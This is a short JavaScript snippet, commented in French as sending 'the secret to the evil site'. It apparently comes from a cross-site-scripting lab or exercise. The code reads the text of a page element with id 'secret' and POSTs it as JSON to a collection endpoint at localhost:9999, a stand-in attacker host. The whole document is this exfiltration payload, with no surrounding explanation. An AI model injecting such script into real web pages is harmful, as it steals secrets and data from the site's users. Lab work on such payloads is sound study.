const secret = document.getElementById('secret').innerText;

//envoie du secret vers le site evil
fetch("http://localhost:9999/collect", {
    method: "POST",
    headers: {
        "Content-Type": "application/json"
    },
    body: JSON.stringify({ secret: secret })
});